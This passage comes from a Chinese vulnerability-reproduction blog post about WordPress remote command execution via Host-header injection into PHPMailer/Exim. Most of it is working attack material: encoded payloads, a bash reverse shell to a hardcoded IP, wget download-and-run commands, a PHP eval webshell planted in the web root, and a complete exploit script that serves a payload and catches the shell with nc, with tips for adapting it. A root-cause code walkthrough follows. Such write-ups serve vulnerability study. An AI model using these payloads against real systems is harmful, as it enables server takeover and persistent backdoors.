<pre><code class="hljs plaintext">aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}test.txt}} null)</code></pre>
<p>![image-20230825191914211](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825191914211.png)</p>
<p>在/tmp目录下发现成功生成了测试文件。</p>
<p>![image-20230825191840698](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825191840698.png)</p>
<h4 id="反弹-shell">反弹 shell</h4>
<p>利用 <code>curl</code> 或者 <code>wget</code> 命令下载远程文件</p>
<blockquote>
<p>测试下载反弹 shell：<br>
注意：</p>
<ul>
<li>攻击机启用 http 服务</li>
<li>远程 URL 中不能有 <code>http://</code></li>
<li>所有字母必须小写</li>
</ul>
</blockquote>
<p>远程反弹shell脚本：<code>ip/a.txt</code>，内容：</p>
<pre><code class="hljs plaintext">bash -i &gt;&amp; /dev/tcp/124.220.233.26/12345 0&gt;&amp;1</code></pre>
<p>payload：</p>
<pre><code class="hljs plaintext">/usr/bin/wget --output-document /tmp/rce 124.220.233.26/a.txt</code></pre>
<p>执行反弹shell：</p>
<pre><code class="hljs plaintext">/bin/bash /tmp/rce</code></pre>
<p>两个payload转换过来就是</p>
<pre><code class="hljs plaintext">aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}wget${substr{10}{1}{$tod_log}}--output-document${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}rce${substr{10}{1}{$tod_log}}124.220.233.26${substr{0}{1}{$spool_directory}}a.txt}} null)

aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}bash${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}rce}} null)</code></pre>
<p>在反弹主机上用nc监听1337端口，分别按顺序提交payload即可获取到反弹shell</p>
<pre><code class="hljs plaintext">nc -lvnp 12345</code></pre>
<p>![image-20230829162742888](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829162742888.png)</p>
<h4 id="写入一句话webshell">写入一句话webshell</h4>
<p>1.txt内容：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span></code></pre>
<p>同理，可以直接下载一句话webshell，然后菜刀连接。payload：</p>
<p>payload：</p>
<pre><code class="hljs plaintext">aa(any -froot@localhost -be ${run{/usr/bin/wget --output-document /var/www/html/1.php 124.220.233.26/1.txt}} null)</code></pre>
<p>转换过来即</p>
<pre><code class="hljs plaintext">aa(any -froot@localhost -be ${run{aa(any${substr{10}{1}{$tod_log}}-froot@localhost${substr{10}{1}{$tod_log}}-be${substr{10}{1}{$tod_log}}${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}wget${substr{10}{1}{$tod_log}}--output-document${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}var${substr{0}{1}{$spool_directory}}www${substr{0}{1}{$spool_directory}}html${substr{0}{1}{$spool_directory}}1.php${substr{10}{1}{$tod_log}}ip${substr{0}{1}{$spool_directory}}1.txt}}${substr{10}{1}{$tod_log}}null)}} null)</code></pre>
<p>![image-20230825203125950](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825203125950.png)</p>
<h2 id="0x05-poc">0x05 POC</h2>
<p>自动化提交 payload，获取反弹 shell。通过 <code>python -mSimpleHTTPServer</code> 80 建立 web 服务，用于目标下载 shell。运行是需要用管理员权限，因为监听了 80 端口。</p>
<p>使用方法<br>
攻击机上运行./exp.sh [<a target="_blank" rel="noopener" href="https://www.77169.net/go?url=http://xx.xx.xx.xx/">http://xx.xx.xx.xx/</a>](<a target="_blank" rel="noopener" href="https://www.77169.net/go?url=http://xx.xx.xx.xx/">http://xx.xx.xx.xx/</a>)即可 其中xx.xx.xx.xx为靶机wordpress的根地址</p>
<pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment">#      __                     __   __  __           __</span>
<span class="hljs-comment">#     / /   ___  ____ _____ _/ /  / / / /___ ______/ /_____  __________</span>
<span class="hljs-comment">#    / /   / _ \/ __ `/ __ `/ /  / /_/ / __ `/ ___/ //_/ _ \/ ___/ ___/</span>
<span class="hljs-comment">#   / /___/  __/ /_/ / /_/ / /  / __  / /_/ / /__/ ,&lt; /  __/ /  (__  )</span>
<span class="hljs-comment">#  /_____/\___/\__, /\__,_/_/  /_/ /_/\__,_/\___/_/|_|\___/_/  /____/</span>
<span class="hljs-comment">#            /____/</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># WordPress 4.6 - Remote Code Execution (RCE) PoC Exploit</span>
<span class="hljs-comment"># CVE-2016-10033</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># wordpress-rce-exploit.sh (ver. 1.0)</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># Discovered and coded by</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># Dawid Golunski (@dawid_golunski)</span>
<span class="hljs-comment"># https://legalhackers.com</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># ExploitBox project:</span>
<span class="hljs-comment"># https://ExploitBox.io</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># Full advisory URL:</span>
<span class="hljs-comment"># https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># Exploit src URL:</span>
<span class="hljs-comment"># https://exploitbox.io/exploit/wordpress-rce-exploit.sh</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># Tested on WordPress 4.6:</span>
<span class="hljs-comment"># https://github.com/WordPress/WordPress/archive/4.6.zip</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># Usage:</span>
<span class="hljs-comment"># ./wordpress-rce-exploit.sh target-wordpress-url</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># Disclaimer:</span>
<span class="hljs-comment"># For testing purposes only</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># -----------------------------------------------------------------</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># Interested in vulns/exploitation?</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment">#                        .;lc'</span>
<span class="hljs-comment">#                    .,cdkkOOOko;.</span>
<span class="hljs-comment">#                 .,lxxkkkkOOOO000Ol'</span>
<span class="hljs-comment">#             .':oxxxxxkkkkOOOO0000KK0x:'</span>
<span class="hljs-comment">#          .;ldxxxxxxxxkxl,.'lk0000KKKXXXKd;.</span>
<span class="hljs-comment">#       ':oxxxxxxxxxxo;.       .:oOKKKXXXNNNNOl.</span>
<span class="hljs-comment">#      '';ldxxxxxdc,.              ,oOXXXNNNXd;,.</span>
<span class="hljs-comment">#     .ddc;,,:c;.         ,c:         .cxxc:;:ox:</span>
<span class="hljs-comment">#     .dxxxxo,     .,   ,kMMM0:.  .,     .lxxxxx:</span>
<span class="hljs-comment">#     .dxxxxxc     lW. oMMMMMMMK  d0     .xxxxxx:</span>
<span class="hljs-comment">#     .dxxxxxc     .0k.,KWMMMWNo :X:     .xxxxxx:</span>
<span class="hljs-comment">#     .dxxxxxc      .xN0xxxxxxxkXK,      .xxxxxx:</span>
<span class="hljs-comment">#     .dxxxxxc    lddOMMMMWd0MMMMKddd.   .xxxxxx:</span>
<span class="hljs-comment">#     .dxxxxxc      .cNMMMN.oMMMMx'      .xxxxxx:</span>
<span class="hljs-comment">#     .dxxxxxc     lKo;dNMN.oMM0;:Ok.    'xxxxxx:</span>
<span class="hljs-comment">#     .dxxxxxc    ;Mc   .lx.:o,    Kl    'xxxxxx:</span>
<span class="hljs-comment">#     .dxxxxxdl;. .,               .. .;cdxxxxxx:</span>
<span class="hljs-comment">#     .dxxxxxxxxxdc,.              'cdkkxxxxxxxx:</span>
<span class="hljs-comment">#      .':oxxxxxxxxxdl;.       .;lxkkkkkxxxxdc,.</span>
<span class="hljs-comment">#          .;ldxxxxxxxxxdc, .cxkkkkkkkkkxd:.</span>
<span class="hljs-comment">#             .':oxxxxxxxxx.ckkkkkkkkxl,.</span>
<span class="hljs-comment">#                 .,cdxxxxx.ckkkkkxc.</span>
<span class="hljs-comment">#                    .':odx.ckxl,.</span>
<span class="hljs-comment">#                        .,.'.</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># https://ExploitBox.io</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># https://twitter.com/Exploit_Box</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># -----------------------------------------------------------------</span>
 
rev_host=<span class="hljs-string">"124.220.233.26"</span>
 
<span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">prep_host_header</span></span>() {
      cmd=<span class="hljs-string">"<span class="hljs-variable">$1</span>"</span>
      rce_cmd=<span class="hljs-string">"\${run{<span class="hljs-variable">$cmd</span>}}"</span>;
 
      <span class="hljs-comment"># replace / with ${substr{0}{1}{$spool_directory}}</span>
      <span class="hljs-comment">#sed 's^/^${substr{0}{1}{$spool_directory}}^g'</span>
      rce_cmd=<span class="hljs-string">"`echo <span class="hljs-variable">$rce_cmd</span> | sed 's^/^\${substr{0}{1}{\$spool_directory}}^g'`"</span>
 
      <span class="hljs-comment"># replace ' ' (space) with</span>
      <span class="hljs-comment">#sed 's^ ^${substr{10}{1}{$tod_log}}$^g'</span>
      rce_cmd=<span class="hljs-string">"`echo <span class="hljs-variable">$rce_cmd</span> | sed 's^ ^\${substr{10}{1}{\$tod_log}}^g'`"</span>
      <span class="hljs-comment">#return "target(any -froot@localhost -be $rce_cmd null)"</span>
      host_header=<span class="hljs-string">"target(any -froot@localhost -be <span class="hljs-variable">$rce_cmd</span> null)"</span>
      <span class="hljs-built_in">return</span> 0
}
 
<span class="hljs-comment">#cat exploitbox.ans</span>
intro=<span class="hljs-string">"</span>
<span class="hljs-string">DQobWzBtIBtbMjFDG1sxOzM0bSAgICAuO2xjJw0KG1swbSAbWzIxQxtbMTszNG0uLGNka2tPT09r</span>
<span class="hljs-string">bzsuDQobWzBtICAgX19fX19fXxtbOEMbWzE7MzRtLiwgG1swbV9fX19fX19fG1s1Q19fX19fX19f</span>
<span class="hljs-string">G1s2Q19fX19fX18NCiAgIFwgIF9fXy9fIF9fX18gG1sxOzM0bScbWzBtX19fXBtbNkMvX19fX19c</span>
<span class="hljs-string">G1s2Q19fX19fX19cXyAgIF8vXw0KICAgLyAgXy8gICBcXCAgIFwvICAgLyAgIF9fLxtbNUMvLyAg</span>
<span class="hljs-string">IHwgIFxfX19fXy8vG1s3Q1wNCiAgL19fX19fX19fXz4+G1s2QzwgX18vICAvICAgIC8tXCBfX19f</span>
<span class="hljs-string">IC8bWzVDXCBfX19fX19fLw0KIBtbMTFDPF9fXy9cX19fPiAgICAvX19fX19fX18vICAgIC9fX19f</span>
<span class="hljs-string">X19fPg0KIBtbNkMbWzE7MzRtLmRkYzssLDpjOy4bWzlDG1swbSxjOhtbOUMbWzM0bS5jeHhjOjs6</span>
<span class="hljs-string">b3g6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eG8sG1s1QxtbMG0uLCAgICxrTU1NMDouICAuLBtb</span>
<span class="hljs-string">NUMbWzM0bS5seHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1QxtbMG1sVy4gb01N</span>
<span class="hljs-string">TU1NTU1LICBkMBtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1</span>
<span class="hljs-string">QxtbMG0uMGsuLEtXTU1NV05vIDpYOhtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDLhtbMTsz</span>
<span class="hljs-string">NG1keHh4eHhjG1s2QxtbMG0ueE4weHh4eHh4eGtYSywbWzZDG1szNG0ueHh4eHh4Og0KG1szN20g</span>
<span class="hljs-string">G1s2Qy4bWzE7MzRtZHh4eHh4YyAgICAbWzBtbGRkT01NTU1XZDBNTU1NS2RkZC4gICAbWzM0bS54</span>
<span class="hljs-string">eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s2QxtbMG0uY05NTU1OLm9NTU1NeCcb</span>
<span class="hljs-string">WzZDG1szNG0ueHh4eHh4Og0KG1szN20gG1s2QxtbMTszNG0uZHh4eHh4YxtbNUMbWzBtbEtvO2RO</span>
<span class="hljs-string">TU4ub01NMDs6T2suICAgIBtbMzRtJ3h4eHh4eDoNChtbMzdtIBtbNkMbWzE7MzRtLmR4eHh4eGMg</span>
<span class="hljs-string">ICAgG1swbTtNYyAgIC5seC46bywgICAgS2wgICAgG1szNG0neHh4eHh4Og0KG1szN20gG1s2Qxtb</span>
<span class="hljs-string">MTszNG0uZHh4eHh4ZGw7LiAuLBtbMTVDG1swOzM0bS4uIC47Y2R4eHh4eHg6DQobWzM3bSAbWzZD</span>
<span class="hljs-string">G1sxOzM0bS5keHh4eCAbWzBtX19fX19fX18bWzEwQ19fX18gIF9fX19fIBtbMzRteHh4eHg6DQob</span>
<span class="hljs-string">WzM3bSAbWzdDG1sxOzM0bS4nOm94IBtbMG1cG1s2Qy9fIF9fX19fX19fXCAgIFwvICAgIC8gG1sz</span>
<span class="hljs-string">NG14eGMsLg0KG1szN20gG1sxMUMbWzE7MzRtLiAbWzBtLxtbNUMvICBcXBtbOEM+G1s3QzwgIBtb</span>
<span class="hljs-string">MzRteCwNChtbMzdtIBtbMTJDLxtbMTBDLyAgIHwgICAvICAgL1wgICAgXA0KIBtbMTJDXF9fX19f</span>
<span class="hljs-string">X19fXzxfX19fX19fPF9fX18+IFxfX19fPg0KIBtbMjFDG1sxOzM0bS4nOm9keC4bWzA7MzRtY2t4</span>
<span class="hljs-string">bCwuDQobWzM3bSAbWzI1QxtbMTszNG0uLC4bWzA7MzRtJy4NChtbMzdtIA0K"</span>
intro2=<span class="hljs-string">"</span>
<span class="hljs-string">ICAgICAgICAgICAgICAgICAgIBtbNDRtfCBFeHBsb2l0Qm94LmlvIHwbWzBtCgobWzk0bSsgLS09</span>
<span class="hljs-string">fBtbMG0gG1s5MW1Xb3JkcHJlc3MgQ29yZSAtIFVuYXV0aGVudGljYXRlZCBSQ0UgRXhwbG9pdBtb</span>
<span class="hljs-string">MG0gIBtbOTRtfBtbMG0KG1s5NG0rIC0tPXwbWzBtICAgICAgICAgICAgICAgICAgICAgICAgICAg</span>
<span class="hljs-string">ICAgICAgICAgICAgICAgICAgICAbWzk0bXwbWzBtChtbOTRtKyAtLT18G1swbSAgICAgICAgICBE</span>
<span class="hljs-string">aXNjb3ZlcmVkICYgQ29kZWQgQnkgICAgICAgICAgICAgICAgG1s5NG18G1swbQobWzk0bSsgLS09</span>
<span class="hljs-string">fBtbMG0gICAgICAgICAgICAgICAbWzk0bURhd2lkIEdvbHVuc2tpG1swbSAgICAgICAgICAgICAg</span>
<span class="hljs-string">ICAgIBtbOTRtfBtbMG0gChtbOTRtKyAtLT18G1swbSAgICAgICAgIBtbOTRtaHR0cHM6Ly9sZWdh</span>
<span class="hljs-string">bGhhY2tlcnMuY29tG1swbSAgICAgICAgICAgICAgG1s5NG18G1swbSAKG1s5NG0rIC0tPXwbWzBt</span>
<span class="hljs-string">ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAbWzk0bXwbWzBt</span>
<span class="hljs-string">ChtbOTRtKyAtLT18G1swbSAiV2l0aCBHcmVhdCBQb3dlciBDb21lcyBHcmVhdCBSZXNwb25zaWJp</span>
<span class="hljs-string">bGl0eSIgG1s5NG18G1swbSAKG1s5NG0rIC0tPXwbWzBtICAgICAgICAqIEZvciB0ZXN0aW5nIHB1</span>
<span class="hljs-string">cnBvc2VzIG9ubHkgKiAgICAgICAgICAbWzk0bXwbWzBtIAoKCg=="</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$intro</span>"</span>  | <span class="hljs-built_in">base64</span> -d
<span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$intro2</span>"</span> | <span class="hljs-built_in">base64</span> -d
 
<span class="hljs-keyword">if</span> [ <span class="hljs-string">"<span class="hljs-variable">$#</span>"</span> -ne 1 ]; <span class="hljs-keyword">then</span>
<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"Usage:\n<span class="hljs-variable">$0</span> target-wordpress-url\n"</span>
<span class="hljs-built_in">exit</span> 1
<span class="hljs-keyword">fi</span>
target=<span class="hljs-string">"<span class="hljs-variable">$1</span>"</span>
<span class="hljs-built_in">echo</span> -ne <span class="hljs-string">"\e[91m[*]\033[0m"</span>
<span class="hljs-built_in">read</span> -p <span class="hljs-string">" Sure you want to get a shell on the target '<span class="hljs-variable">$target</span>' ? [y/N] "</span> choice
<span class="hljs-built_in">echo</span>
 
<span class="hljs-keyword">if</span> [ <span class="hljs-string">"<span class="hljs-variable">$choice</span>"</span> == <span class="hljs-string">"y"</span> ]; <span class="hljs-keyword">then</span>
 
<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\e[92m[*]\033[0m Guess I can't argue with that... Let's get started...\n"</span>
<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\e[92m[+]\033[0m Connected to the target"</span>
 
<span class="hljs-comment"># Serve payload/bash script on :80</span>
RCE_exec_cmd=<span class="hljs-string">"(sleep 3s &amp;&amp; nohup bash -i &gt;/dev/tcp/<span class="hljs-variable">$rev_host</span>/5555 0&lt;&amp;1 2&gt;&amp;1) &amp;"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$RCE_exec_cmd</span>"</span> &gt; rce.txt
python -mSimpleHTTPServer 80 2&gt;/dev/null &gt;&amp;2 &amp;
hpid=$!
 
<span class="hljs-comment"># Save payload on the target in /tmp/rce</span>
cmd=<span class="hljs-string">"/usr/bin/curl -o/tmp/rce <span class="hljs-variable">$rev_host</span>/rce.txt"</span>
prep_host_header <span class="hljs-string">"<span class="hljs-variable">$cmd</span>"</span>
curl -H<span class="hljs-string">"Host: <span class="hljs-variable">$host_header</span>"</span> -s -d <span class="hljs-string">'user_login=@1_h bcx&amp;wp-submit=Get+New+Password'</span> <span class="hljs-variable">$target</span>/wp-login.php?action=lostpassword
<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\n\e[92m[+]\e[0m Payload sent successfully"</span>
 
<span class="hljs-comment"># Execute payload (RCE_exec_cmd) on the target /bin/bash /tmp/rce</span>
cmd=<span class="hljs-string">"/bin/bash /tmp/rce"</span>
prep_host_header <span class="hljs-string">"<span class="hljs-variable">$cmd</span>"</span>
curl -H<span class="hljs-string">"Host: <span class="hljs-variable">$host_header</span>"</span> -d <span class="hljs-string">'user_login=@1_h bcx&amp;wp-submit=Get+New+Password'</span> <span class="hljs-variable">$target</span>/wp-login.php?action=lostpassword &amp;
<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\n\e[92m[+]\033[0m Payload executed!"</span>
 
<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\n\e[92m[*]\033[0m Waiting for the target to send us a \e[94mreverse shell\e[0m...\n"</span>
nc -nvv -l -p 5555
<span class="hljs-built_in">echo</span>
<span class="hljs-keyword">else</span>
<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\e[92m[+]\033[0m Responsible choice ;) Exiting.\n"</span>
<span class="hljs-built_in">exit</span> 0
 
<span class="hljs-keyword">fi</span>
 
<span class="hljs-built_in">echo</span> <span class="hljs-string">"Exiting..."</span>
<span class="hljs-built_in">exit</span> 0</code></pre>
<h3 id="脚本需要修改的部分">脚本需要修改的部分</h3>
<p>三个地方 第一处 #1 line 1</p>
<pre><code class="hljs plaintext">rev_host="192.168.57.1" #1</code></pre>
<p>这边要替换成你的攻击机的ip地址，一般是和靶机处在一个局域网内的，可以提前访问下wordpress的网站进行测试。<br>
第二处 #2 line 75</p>
<p>第三处 #3 line 80</p>
<pre><code class="hljs sh">curl -H<span class="hljs-string">"Host: <span class="hljs-variable">$host_header</span>"</span> -s -d <span class="hljs-string">'user_login=admin&amp;wp-submit=Get+New+Password'</span> <span class="hljs-variable">$target</span>/wp-login.php?action=lostpassword <span class="hljs-comment">#2</span>
<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\n\e[92m[+]\e[0m Payload sent successfully"</span>
<span class="hljs-comment"># Execute payload (RCE_exec_cmd) on the target /bin/bash /tmp/rce</span>
cmd=<span class="hljs-string">"/bin/bash /tmp/rce"</span>
prep_host_header <span class="hljs-string">"<span class="hljs-variable">$cmd</span>"</span>
curl -H<span class="hljs-string">"Host: <span class="hljs-variable">$host_header</span>"</span> -d <span class="hljs-string">'user_login=admin&amp;wp-submit=Get+New+Password'</span> <span class="hljs-variable">$target</span>/wp-login.php?action=lostpassword &amp; <span class="hljs-comment">#3</span></code></pre>
<p>这两个地方主要要修改的可能是user_login=admin这个参数，这个poc里默认的是admin<br>
这里其实就是你装wordpress时管理员的或者任意一个用户的邮箱<br>
因为找回密码时他会先判断邮箱是否存在，再进行下一步<br>
如果这里邮箱不存在 你发包是返回200 告诉你邮箱不存在<br>
如果是存在有的邮箱，就是返回302跳转到输入邮箱密码的界面 同时告诉你邮件已经发了<br>
下面是burp模拟攻击时候的抓包 返回的是302时说明已经命令执行成功</p>
<p>![image-20230829164046765](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829164046765.png)</p>
<p>可以看到靶机上也确实出现了rce文件</p>
<p>这边执行的命令是<code>/usr/bin/wget --output-document /tmp/rce 124.220.233.26/a.txt</code></p>
<p>![image-20230829164134260](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829164134260.png)</p>
<p>这三个地方改好了之后，脚本就可以运行了</p>
<h3 id="脚本的主要流程">脚本的主要流程：</h3>
<blockquote>
<ol>
<li>生成本地rce.txt 里面写的是是建立连接的命令</li>
<li>命令执行第一次 curl攻击机获取rce.txt 写到/tmp目录下</li>
<li>命令执行第二次 运行tmp目录下的rce</li>
<li>nc连接靶机</li>
</ol>
</blockquote>
<h2 id="0x06-漏洞原理深入">0x06 漏洞原理深入</h2>
<p>将docker中的wordpress源码拷贝出来<code>sudo docker cp pwnscriptum_web_1:/var/www/html /home/jgc/code</code></p>
<p>根据忘记密码页面的url<code>wp-login.php?action=lostpassword</code>定位到<code>wp-login.php</code>的<code>retrieve_password</code>函数，此函数是对密码的操作函数。</p>
<p>此函数中对用户输入进行处理后，最后通过以下代码发送邮件</p>
<pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">retrieve_password</span>(<span class="hljs-params"></span>) </span>{
	......
        
	<span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">apply_filters</span>( <span class="hljs-string">'retrieve_password_message'</span>, <span class="hljs-variable">$message</span>, <span class="hljs-variable">$key</span>, <span class="hljs-variable">$user_login</span>, <span class="hljs-variable">$user_data</span> );

	<span class="hljs-keyword">if</span> ( <span class="hljs-variable">$message</span> &amp;&amp; !<span class="hljs-title function_ invoke__">wp_mail</span>( <span class="hljs-variable">$user_email</span>, <span class="hljs-title function_ invoke__">wp_specialchars_decode</span>( <span class="hljs-variable">$title</span> ), <span class="hljs-variable">$message</span> ) )
		<span class="hljs-title function_ invoke__">wp_die</span>( <span class="hljs-title function_ invoke__">__</span>(<span class="hljs-string">'The email could not be sent.'</span>) . <span class="hljs-string">"&lt;br /&gt;\n"</span> . <span class="hljs-title function_ invoke__">__</span>(<span class="hljs-string">'Possible reason: your host may have disabled the mail() function.'</span>) );

	<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
}</code></pre>
<p>跟进<code>wp_mail</code>函数，定位到<code>/wp-includes/pluggable.php</code></p>
<p>函数中其中关于host的设置如下</p>
<pre><code class="hljs php"><span class="hljs-keyword">if</span> ( !<span class="hljs-keyword">isset</span>( <span class="hljs-variable">$from_name</span> ) )
		<span class="hljs-variable">$from_name</span> = <span class="hljs-string">'WordPress'</span>;

	<span class="hljs-keyword">if</span> ( !<span class="hljs-keyword">isset</span>( <span class="hljs-variable">$from_email</span> ) ) {
		<span class="hljs-comment">// Get the site domain and get rid of www.</span>
		<span class="hljs-variable">$sitename</span> = <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'SERVER_NAME'</span>] );
		<span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">substr</span>( <span class="hljs-variable">$sitename</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span> ) == <span class="hljs-string">'www.'</span> ) {
			<span class="hljs-variable">$sitename</span> = <span class="hljs-title function_ invoke__">substr</span>( <span class="hljs-variable">$sitename</span>, <span class="hljs-number">4</span> );
		}

		<span class="hljs-variable">$from_email</span> = <span class="hljs-string">'wordpress@'</span> . <span class="hljs-variable">$sitename</span>;
	}

	<span class="hljs-variable">$from_email</span> = <span class="hljs-title function_ invoke__">apply_filters</span>( <span class="hljs-string">'wp_mail_from'</span>, <span class="hljs-variable">$from_email</span> );

	<span class="hljs-variable">$from_name</span> = <span class="hljs-title function_ invoke__">apply_filters</span>( <span class="hljs-string">'wp_mail_from_name'</span>, <span class="hljs-variable">$from_name</span> );

	<span class="hljs-variable">$phpmailer</span>-&gt;<span class="hljs-title function_ invoke__">setFrom</span>( <span class="hljs-variable">$from_email</span>, <span class="hljs-variable">$from_name</span> );</code></pre>
<p>根据代码可以看出wordpress基于<code>$_SERVER['SERVER_NAME']</code>来构造<code>$from_email</code>发送邮件的域，前面拼接上<code>wordpress@</code></p>
<p><code>$_SERVER['SERVER_NAME']</code>参数是通过请求头<code>Host</code>字段传入，并且这里只是简单的使用<code>substr</code>去掉了前面的<code>www.</code>，没有任何过滤措施。</p>
<p>在docker中添加a.php代码来查看<code>$_SERVER['SERVER_NAME']</code>的值</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'SERVER_NAME'</span>])){
    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'SERVER_NAME'</span>];
}<span class="hljs-keyword">else</span>{
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"no value"</span>;
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>在下图中看到就是Host字段的值</p>
<p>![image-20230829160821813](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829160821813.png)</p>
<p>接着跟进<code>setFrom</code>函数，定位到<code>wp-includes/class-phpmailer.php</code>，发现其用到了PHPMailer组件</p>
<p><code>setFrom</code>函数如下，这个函数对数据进行校验，没问题的话设置Sender变量为address变量的值</p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setFrom</span>(<span class="hljs-params"><span class="hljs-variable">$address</span>, <span class="hljs-variable">$name</span> = <span class="hljs-string">''</span>, <span class="hljs-variable">$auto</span> = <span class="hljs-literal">true</span></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable">$address</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$address</span>);
        <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">'/[\r\n]+/'</span>, <span class="hljs-string">''</span>, <span class="hljs-variable">$name</span>)); <span class="hljs-comment">//Strip breaks and trim</span>
        <span class="hljs-comment">// Don't validate now addresses with IDN. Will be done in send().</span>
        <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$pos</span> = <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$address</span>, <span class="hljs-string">'@'</span>)) === <span class="hljs-literal">false</span> <span class="hljs-keyword">or</span>
            (!<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">has8bitChars</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$address</span>, ++<span class="hljs-variable">$pos</span>)) <span class="hljs-keyword">or</span> !<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">idnSupported</span>()) <span class="hljs-keyword">and</span>
            !<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">validateAddress</span>(<span class="hljs-variable">$address</span>)) {
            <span class="hljs-variable">$error_message</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">lang</span>(<span class="hljs-string">'invalid_address'</span>) . <span class="hljs-variable">$address</span>;
            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">setError</span>(<span class="hljs-variable">$error_message</span>);
            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">edebug</span>(<span class="hljs-variable">$error_message</span>);
            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;exceptions) {
